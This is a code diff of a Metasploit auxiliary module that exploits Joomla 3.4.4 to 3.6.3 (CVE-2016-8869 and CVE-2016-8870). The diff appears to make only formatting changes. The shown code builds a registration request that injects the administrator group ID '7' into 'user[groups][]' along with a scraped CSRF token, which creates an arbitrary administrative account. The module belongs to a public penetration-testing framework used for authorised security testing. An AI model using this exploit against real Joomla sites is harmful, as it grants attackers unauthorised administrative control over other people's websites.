@@ -1,36 +1,35 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HTTP::Joomla
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Joomla Account Creation and Privilege Escalation',
-      'Description'    => %q{
-        This module creates an arbitrary account with administrative privileges in Joomla versions 3.4.4
-        through 3.6.3. If an email server is configured in Joomla, an email will be sent to activate the account (the account is disabled by default).
-      },
-      'References'     =>
-        [
-          ['CVE', '2016-8869'],
-          ['CVE', '2016-8870'],
-          ['URL', 'https://developer.joomla.org/security-centre/660-20161002-core-elevated-privileges.html'],
-          ['URL', 'https://developer.joomla.org/security-centre/659-20161001-core-account-creation.html'],
-          ['URL', 'https://medium.com/@showthread/joomla-3-6-4-account-creation-elevated-privileges-write-up-and-exploit-965d8fb46fa2']
-        ],
-      'Author'         =>
-        [
-          'Fabio Pires <fp[at]integrity.pt>',     # module creation and privilege escalation
-          'Filipe Reis <fr[at]integrity.pt>',     # module creation and privilege escalation
-          'Vitor Oliveira <vo[at]integrity.pt>',  # module creation and privilege escalation
-        ],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => 'Oct 25 2016'
-    ))
+                      'Name'           => 'Joomla Account Creation and Privilege Escalation',
+                      'Description'    => %q{
+                        This module creates an arbitrary account with administrative privileges in Joomla versions 3.4.4
+                        through 3.6.3. If an email server is configured in Joomla, an email will be sent to activate the account (the account is disabled by default).
+                      },
+                      'References'     =>
+                        [
+                          ['CVE', '2016-8869'],
+                          ['CVE', '2016-8870'],
+                          ['URL', 'https://developer.joomla.org/security-centre/660-20161002-core-elevated-privileges.html'],
+                          ['URL', 'https://developer.joomla.org/security-centre/659-20161001-core-account-creation.html'],
+                          ['URL', 'https://medium.com/@showthread/joomla-3-6-4-account-creation-elevated-privileges-write-up-and-exploit-965d8fb46fa2']
+                        ],
+                      'Author'         =>
+                        [
+                          'Fabio Pires <fp[at]integrity.pt>',     # module creation and privilege escalation
+                          'Filipe Reis <fr[at]integrity.pt>',     # module creation and privilege escalation
+                          'Vitor Oliveira <vo[at]integrity.pt>',  # module creation and privilege escalation
+                        ],
+                      'License'        => MSF_LICENSE,
+                      'DisclosureDate' => 'Oct 25 2016'))
 
     register_options(
       [
@@ -69,9 +68,7 @@ class MetasploitModule < Msf::Auxiliary
     hidden_list = hidden_fields
     hidden_list.each do |fields|
       fields.each do |item|
-        if item[0].length == 32 && item[1] == '1'
-          return item[0]
-        end
+        return item[0] if item[0].length == 32 && item[1] == '1'
       end
     end
   end
@@ -108,12 +105,12 @@ class MetasploitModule < Msf::Auxiliary
     mime.add_part(datastore['USERNAME'], nil, nil, 'form-data; name="user[username]"')
     mime.add_part('7', nil, nil, 'form-data; name="user[groups][]"')
     mime.add_part(datastore['PASSWORD'], nil, nil, 'form-data; name="user[password1]"')
-    mime.add_part(datastore['PASSWORD'] , nil, nil, 'form-data; name="user[password2]"')
+    mime.add_part(datastore['PASSWORD'], nil, nil, 'form-data; name="user[password2]"')
     mime.add_part(datastore['EMAIL'], nil, nil, 'form-data; name="user[email1]"')
     mime.add_part(datastore['EMAIL'], nil, nil, 'form-data; name="user[email2]"')
     mime.add_part('com_users', nil, nil, 'form-data; name="option"')
     mime.add_part('user.register', nil, nil, 'form-data; name="task"')
-    mime.add_part('1', nil, nil, 'form-data; name="' + csrf +'"')
+    mime.add_part('1', nil, nil, 'form-data; name="' + csrf + '"')
 
     res = send_request_cgi(
       'method' => 'POST',
@@ -132,7 +129,7 @@ class MetasploitModule < Msf::Auxiliary
       res = send_request_cgi!(
         'uri' => res.redirection.path,
         'method' => 'GET',
-        'cookie'  => cookie
+        'cookie' => cookie
       )
 
       print_error("There was an issue, but the user could have been created.")
